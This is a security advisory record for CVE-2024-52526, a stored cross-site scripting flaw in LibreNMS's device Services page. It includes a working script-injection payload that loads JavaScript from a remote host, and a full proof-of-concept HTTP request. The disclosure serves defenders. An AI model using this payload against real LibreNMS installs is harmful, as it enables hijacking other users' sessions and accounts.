advisory_id: GHSA-8fh4-942r-jf2g
datasource_id: github_osv_importer_v2/GHSA-8fh4-942r-jf2g
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-8fh4-942r-jf2g/GHSA-8fh4-942r-jf2g.json
aliases:
  - CVE-2024-52526
summary: |
  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/services.inc.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Services" tab of the Device page allows authenticated users to inject arbitrary JavaScript through the "descr" parameter when adding a service to a device. This vulnerability could result in the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and enabling unauthorized actions.

  ### Details
  When creating a device through the "edit device -> services" workflow (example path: "/device/15/edit/section=services"), the attacker can inject an XSS payload in the "descr" parameter. This payload is reflected in the "Services" tab of the device (URL: "/device/15/services"). It is important to note that the vulnerability does not exist when creating devices through the normal "Add Service" interface (created through the ajax_form.php request with the "type=create-service").

  The payload used to exploit this vulnerability is:
  ```Descr'"><script/src=//15.rs></script>```

  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

  The root cause is the application's failure to sanitize the "descr" parameter before outputting it in the HTML. The sink is as follows:
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/services.inc.php#L87

  ### PoC
  1. Create a service for a device using the following payload in the "descr" parameter:
  ```Descr'"><script/src=//15.rs></script>```
  2. Save the service.
  3. Navigate to the "Services" tab of the device.
  4. Observe that the injected script executes in the "Services" tab.

  Example Request:
  ```http
  POST /device/15/edit/section=services HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded
  Cookie: <your_cookie>

  _token=<your_token>&name=Name'"><script/src=//15.rs></script>&addsrv=yes&device=15&type=pollen&descr=Descr'"><script/src=//15.rs></script>&ip=IP'"><script/src=//15.rs></script>&params=Params'"><script/src=//15.rs></script>&Submit=
  ```

  ### Impact

  This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the "Services" tab of the device. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<=24.9.1
    fixed_versions: vers:composer/24.10.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-8fh4-942r-jf2g/GHSA-8fh4-942r-jf2g.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/30e522c29bbb1f9b72951025e7049a26c7e1d76e
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-8fh4-942r-jf2g
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-52526
    reference_type:
    reference_id: CVE-2024-52526
